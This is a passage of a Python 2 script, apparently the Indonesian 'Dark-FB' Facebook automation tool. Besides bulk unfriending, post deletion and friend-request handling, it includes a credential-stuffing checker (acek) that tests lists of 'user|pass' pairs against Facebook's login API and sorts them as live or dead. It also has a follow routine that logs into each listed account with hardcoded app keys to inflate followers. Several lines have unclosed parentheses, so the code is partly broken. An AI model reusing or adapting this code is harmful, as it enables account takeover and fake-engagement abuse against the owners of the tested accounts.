		    print tutup+"\033[37;1m["+lime+"\033[32;1m+"+tutup+"\033[37;1m] Berhasil : "+lime+y['name']+tutup
	    else:
		    print tutup+"\033[37;1m["+merah+"\033[31;1m*"+tutup+"\033[37;1m] Gagal : "+lime+y['name']+tutup
    print tutup+"\033[37;1m["+lime+"\033[32;1m+"+tutup+"\033[37;1m] Done"+tutup
    raw_input(tutup+"\nEnter returns to the menu ...")
    menu()


def acc():
    try:
    	token = open('logs.txt').read()
    except:
    	menu()
    limit = raw_input(tutup+"\033[37;1m["+lime+"\033[31;1m*"+tutup+"\033[37;1m] Limit : "
    r = requests.get('https://graph.facebook.com/me/friendrequests?limit='+limit+'&access_token='+token)
    t = json.loads(r.text)
    if '[]' in str(t['data']):
	    print tutup+"\033[37;1m["+merah+"\033[31;1m*"+tutup+"\033[37;1m] No friend request"+tutup
	    raw_input(tutup+"\nEnter returns to the menu ...")
	    menu()
    for i in t['data']:
	    r = requests.post('https://graph.facebook.com/me/friends/'+i['from']['id']+'?access_token='+token)
	    a = json.loads(r.text)
	    if 'error' in str(a):
		    print tutup+"\033[37;1m["+merah+"\033[31;1m*"+tutup+"\033[37;1m] Gagal = "+i['from']['name']
	    else:
		    print tutup+"\033[37;1m["+lime+"\033[33;1m*"+tutup+"\033[37;1m] Terima = "+i['from']['name']
    print tutup+"\033[37;1m["+lime+"\033[32;1m*"+tutup+"\033[37;1m] Done"+tutup
    raw_input(tutup+"\nEnter returns to the menu ...")
    menu()


def delete():
    try:
    	token = open('logs.txt').read()
    except:
    	menu()
    print tutup + '\033[37;1m[' + merah + '\033[31;1m*' + tutup + '\033[37;1m]\033[31;1m INFO\033[37;1m : CTRL+C to STOP'
    print tutup + '\033[37;1m[' + lime + '\033[32;1m*' + tutup + '\033[37;1m] Start ...'
    try:
        r = requests.get('https://graph.facebook.com/me/friends?access_token=' + token)
        t = json.loads(r.text)
        for i in t['data']:
            nama = i['name']
            id = i['id']
            requests.delete('https://graph.facebook.com/me/friends?uid=' + id + '&access_token=' + token)
            print tutup + '\033[37;1m[' + lime + '\033[31;1m*' + tutup + '\033[37;1m] Deleted = ' + nama

    except IndexError:
        pass
    except KeyboardInterrupt:
        exit(tutup + '\033[37;1m[' + merah + '\033[31;1m*' + tutup + '\033[37;1m] Stopped.')

    print tutup + '\033[37;1m[' + lime + '\033[32;1m+' + tutup + '\033[37;1m] Done' + tutup
    raw_input(tutup + '\nEnter returns to the menu ...')
    menu()


def deletepost():
    loop = 0
    try:
    	token = open('logs.txt').read()
    except:
    	menu()
    print tutup + '\033[38;1m[' + merah + '\033[31;1m*' + tutup + '\033[37;1m]\033[31;1m INFO\033[37;1m : CTRL+C to STOP'
    print tutup + '\033[37;1m[' + lime + '\033[32;1m+' + tutup + '\033[37;1m] Start ...'
    try:
        r = requests.get('https://graph.facebook.com/me/feed?access_token=' + token)
        f = json.loads(r.text)
        for y in f['data']:
            id = y['id']
            url = requests.get('https://graph.facebook.com/' + id + '?method=delete&access_token=' + token)
            get = json.loads(url.text)
            try:
                error = get['error']['message']
                print tutup + '\033[37;1m[' + merah + '\033[31;1m*' + tutup + '\033[37;1m] Gagal : ' + id
            except TypeError:
                print tutup + '\033[37;1m[' + lime + '\033[31;1m*' + tutup + '\033[37;1m] Terhapus : ' + id
                loop += 1

    except KeyboardInterrupt:
        exit(tutup + '\033[37;1m[' + merah + '\033[31;1m*' + tutup + '\033[37;1m] Stopped.')

    print tutup + '\033[37;1m[' + lime + '\033[32;1m*' + tutup + '\033[37;1m] Done' + tutup
    raw_input(tutup + '\nEnter returns to the menu ...')
    menu()


def follow():
    try:
    	token = open('logs.txt').read()
    except:
    	menu()
    print tutup + '\033[37;1m[' + merah + '\033[31;1m*' + tutup + "\033[37;1m]\033[31;1m INFO\033[37;1m : Pemisah 'user|pass'"
    file = raw_input(tutup + '\033[37;1m[' + lime + '\033[32;1m+' + tutup + '\033[37;1m] List account : '
    idt = raw_input(tutup + '\033[37;1m[' + lime + '\033[32;1m+' + tutup + '\033[37;1m] Your account id : '
    isi = open(file, 'r').read().splitlines()
    print tutup + '\033[37;1m[' + lime + '\033[32;1m*' + tutup + '\033[37;1m] Start ...'
    for z in isi:
        o = z.split('|')
        user = o[0]
        pw = o[1]
        print tutup + '\033[37;1m[' + ungu + '\033[33;1m*' + tutup + '\033[37;1m] Follow with account = ' + user + '|' + pw + tutup
        try:
            api_seret = '62f8ce9f74b12f84c123cc23437a4a32'
            data = {'api_key': '882a8490361da98702bf97a021ddc14d', 'credentials_type': 'password', 'email': user, 'format': 'JSON', 'generate_machine_id': '1', 'generate_session_cookies': '1', 'locale': 'en_US', 'method': 'auth.login', 'password': pw, 'return_ssl_resources': '0', 'v': '1.0'}
            sig = ('api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail=' + user + 'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword=' + pw + 'return_ssl_resources=0v=1.0' + api_seret).encode('utf-8')
            x = hashlib.new('md5')
            x.update(sig)
            data.update({'sig': x.hexdigest()})
            urls = requests.get('https://api.facebook.com/restserver.php', params=data)
            b = json.loads(urls.text)
            toke = b['access_token']
        except KeyError:
            print tutup + '\033[37;1m[' + merah + '\033[31;1m*' + tutup + '\033[37;1m] Login failed'
        else:
            try:
                r = requests.post('https://graph.facebook.com/' + idt + '/subscribers?access_token=' + toke)
                if 'error' in str(r.text):
                    print tutup + '\033[37;1m[' + merah + '\033[31;1m*' + tutup + '\033[37;1m] Gagal' + tutup
                elif 'true' in str(r.text):
                    print tutup + '\033[37;1m[' + lime + '\033[32;1m*' + tutup + '\033[37;1m] Berhasil' + tutup
                else:
                    print tutup + '\033[37;1m[' + merah + '\033[31;1m*' + tutup + '\033[37;1m] Error' + tutup
            except:
                pass

    print tutup + '\033[37;1m[' + lime + '\033[32;1m' + tutup + '\033[37;1m] Done' + tutup
    raw_input(tutup + '\nEnter returns to the menu ...')
    menu()


def status():
    try:
    	token = open('logs.txt').read()
    except:
    	menu()
    capt = raw_input(tutup+"\033[37;1m["+lime+"\033[32;1m*"+tutup+"\033[37;1m] Caption : "
    if capt =="":
	    exit(tutup+"\033[37;1m["+merah+"\033[31;1m*"+tutup+"\033[37;1m] Exit"+tutup)
    else:
	    print tutup+"\033[37;1m["+lime+"\033[32;1m*"+tutup+"\033[37;1m] Create ..."
	    r = requests.get("https://graph.facebook.com/me/feed?method=POST&message="+capt+"&access_token="+token)
	    x = json.loads(r.text)
	    print tutup+"\033[37;1m["+lime+"\033[32;1m*"+tutup+"\033[37;1m] Status ID : "+x['id']
    print tutup+"\033[37;1m["+lime+"\033[32;1m*"+tutup+"\033[37;1m] Done"+tutup
    raw_input(tutup+"\nEnter returns to the menu ...")
    menu()


def guard():
    try:
        token = open('logs.txt').read()
    except:
        menu()
    print tutup + '\033[37;1m[' + lime + '\033[36;1m01' + tutup + '\033[37;1m] Aktifkan    ' + tutup + '\033[37;1m' + lime + \'\033[36;1m02' + tutup + '\033[37;1m Matikan'
    print
    ha = raw_input(tutup + '\033[37;1m[' + lime + '\033[31;1mSelection' + tutup + '\033[37;1m]> '
    if ha == '':
        exit(tutup + '\033[37;1m[' + merah + '\033[31;1m*' + tutup + '\033[37;1m] Exit' + tutup)
    elif ha in ('1', '\033[36;1m01'):
        aktif = '\033[37;1mtrue'
        gaz(token, aktif)
    elif ha in ('2', '\033[36;1m02'):
        non = '\033[37;1mfalse'
        gaz(token, non)
    else:
        exit(tutup + '\033[37;1m[' + merah + '\033[31;1m*' + tutup + '\033[37;1m] Exit' + tutup)


def gaz(token, enable=True):
    r = requests.get("https://graph.facebook.com/me?access_token="+token)
    g = json.loads(r.text)
    id = g["id"]
    data = 'variables={"0":{"is_shielded": %s,"session_id":"9b78191c-84fd-4ab6-b0aa-19b39f04a6bc","actor_id":"%s","client_mutation_id":"b0316dd6-3fd6-4beb-aed4-bb29c5dc64b0"}}&method=post&doc_id=1477043292367183&query_name=IsShieldedSetMutation&strip_defaults=true&strip_nulls=true&locale=en_US&client_country_code=US&fb_api_req_friendly_name=IsShieldedSetMutation&fb_api_caller_class=IsShieldedSetMutation' % (enable, str(id))
    headers = {"Content-Type" : "application/x-www-form-urlencoded", "Authorization" : "OAuth %s" % token}
    url = "https://graph.facebook.com/graphql"
    pek = requests.post(url, data = data, headers = headers)
    if '"is_shielded":true' in pek.text:
	    print tutup+"\033[37;1m["+lime+"\033[31;1m+"+tutup+"\033[37;1m] Telah diaktifkan"+tutup
	    print tutup+"\033[37;1m["+lime+"\033[32;1m+"+tutup+"\033[37;1m] Done"+tutup
	    raw_input(tutup+"\nEnter returns to the menu ...")
	    menu()
    elif '"is_shielded":false' in pek.text:
	    print tutup+"\033[37;1m["+lime+"\033[31;1m+"+tutup+"\033[37;1m] Telah dimatikan"+tutup
	    print tutup+"\033[37;1m["+lime+"\033[32;1m+"+tutup+"\033[37;1m] Done"+tutup
	    raw_input(tutup+"\nEnter returns to the menu ...")
	    menu()
    else:
	    exit(tutup+"\033[37;1m["+merah+"\033[31;1m*"+tutup+"\033[37;1m] Error"+tutup)


def lgrup():
    try:
        token = open('logs.txt').read()
    except:
        print('\033[37;1m[\033[31;1m*\033[37;1m] Token Tidak Ada')
        menu()
    print
    listgrup = []
    r = requests.get('https://graph.facebook.com/me/groups?access_token='+token)
    grup = json.loads(r.text)
    for g in grup['data']:
	    nama = g["name"]
	    id = g["id"]
	    listgrup.append(id)
	    print tutup+"\033[37;1m["+lime+"\033[32;1m+"+tutup+"\033[37;1m] "+id+" | "+nama+tutup
    print tutup+"\033[37;1m["+lime+"\033[33;1m*"+tutup+"\033[37;1m] Total Group : "+lime+str(len(listgrup))+tutup
    print tutup+"\033[37;1m["+lime+"\033[33;1m*"+tutup+"\033[37;1m] Done"+tutup
    raw_input(tutup+"\nEnter returns to the menu ...")
    menu()


def acek():
    try:
    	token = open('logs.txt').read()
    except:
    	menu()
    live = []
    cek = []
    die = []
    print tutup + '\033[37;1m[' + merah + '\033[31;1m*' + tutup + "\033[37;1m]\033[31;1m INFO\033[37;1m : Pemisah 'user|pass'"
    file = raw_input(tutup + '\033[37;1m[' + lime + '\033[33;1m*' + tutup + '\033[37;1m] List account : '
    try:
        list = open(file, 'r').readlines()
    except IOError:
        exit(tutup + '\033[37;1m[' + merah + '\033[31;1m*' + tutup + '\033[37;1m] File not found' + tutup)

    for x in list:
        user, pw = x.strip().split(str('|'))
        r = requests.get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pw + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
        z = json.loads(r.text)
        if 'access_token' in z:
            live.append(user)
            print tutup + '\033[37;1m[' + lime + '\033[32;1m+' + tutup + '\033[37;1m] Live = ' + user + '|' + pw
        elif 'www.facebook.com' in z['error_msg']:
            cek.append(user)
            print tutup + '\033[37;1m[' + kuning + '\033[31;1m*' + tutup + '\033[37;1m] Check = ' + user + '|' + pw
        else:
            die.append(user)
            print tutup + '\033[37;1m[' + merah + '\033[33;1m*' + tutup + '\033[37;1m] Die = ' + user + '|' + pw

    print tutup + '\033[37;1m[' + lime + '\033[33;1m+' + tutup + '\033[37;1m] Total : ' + lime + str(len(live)) + tutup + ' ' + kuning + str(len(cek)) + tutup + ' ' + merah + str(len(die)) + tutup
    print tutup + '\033[37;1m[' + lime + '\033[33;1m+' + tutup + '\033[37;1m] Done' + tutup
    raw_input(tutup + '\nEnter returns to the menu ...')
    menu()


def acekpp():
    try:
    	token = open('logs.txt').read()
    except:
    	menu()
    print tutup + '\033[37;1m[' + merah + '\033[31;1m!' + tutup + '\033[37;1m]\033[31;1m INFO\033[37;1m : Login dengan akun yang ingin di cek'
    user = raw_input(tutup + '\033[37;1m[' + lime + '\033[33;1m+' + tutup + '\033[37;1m] Username : ' + lime)
    pw = raw_input(tutup + '\033[37;1m[' + lime + '\033[33;1m+' + tutup + '\033[37;1m] Password : ' + lime)
    print tutup + '\033[37;1m[' + ungu + '\033[33;1m*' + tutup + '\033[37;1m] Check with account = ' + user + '|' + pw + tutup
    data = {'email': user, 'pass': pw}
    r = apa.post('https://mbasic.facebook.com/login', data=data).text.encode('utf-8')
    if 'save-device' in str(r) or 'm_sess' in str(r):
        bs = sup(apa.get('https://mbasic.facebook.com/settings/apps/tabbed/').text, features='html.parser')
        for z in bs.find_all('h3'):
            x = z.find('div')
            if 'None' in str(x):
                continue
            else:
                print tutup + '[' + lime + '~' + tutup + ']', x.text

    else:
        print tutup + '\033[37;1m[' + merah + '\033[31;1m*' + tutup + '\033[37;1m] Login gagal'
    print tutup + '\033[37;1m[' + lime + '\033[33;1m*' + tutup + '\033[37;1m] Done' + tutup
    raw_input(tutup + '\nEnter returns to the menu ...')
    menu()


def infotools():
    os.system('clear')
    print ("""     __  __      ____                  _
    |  \/  |_ __| __ )  __ _  ___ ___ | |_                     | |\/| | __|  _ \ / _` |/ __/ _ \| __|                     | |  | | | _| |_) | (_| | (_| (_) | |_                     |_|  |_|_|(_)____/ \__,_|\___\___/ \__|                ---------------------------------------------                             [ TOOLS INFO ]
Author  : Mr.Bacot
Support : Mr.Lonte
Name    : PePek Anjink
Version : v1.9
---------------------------------------------""" )
    print merah + '             ||    || ' + tutup + u' \x1b[7m Author: Acil Sean\x1b[0m' + tutup
    print ''
    print kuning + '                 Coded' + tutup + ' : ' + at
    print kuning + '               Support' + tutup + ' : ./Mr.Lent3RN'
    print kuning + '                Source' + tutup + ' : ' + lime + 'https://github.com/tukangpulug199'
    print kuning + '            Name Tools' + tutup + ' : Dark-FB'
    print kuning + '               Version' + tutup + ' : 1.9'
    print kuning + '              Language' + tutup + ' : English/Indonesian'
    print kuning + '          Date Release' + tutup + ' : 25/09/2019'
    print kuning + '               Contact' + tutup + ' : 0838-7876-4936'
    print kuning + '        Status License' + tutup + ' : OK'
    print '\n\n\n'
    print putih + '        Copyright \xc2\xa9 2019 IDNCoder. All Rights Reserved' + tutup
    print '\n\n\n\n'
    raw_input(tutup + '\nEnter returns to the menu ...')
    menu()


if __name__ == '__main__':
    login()
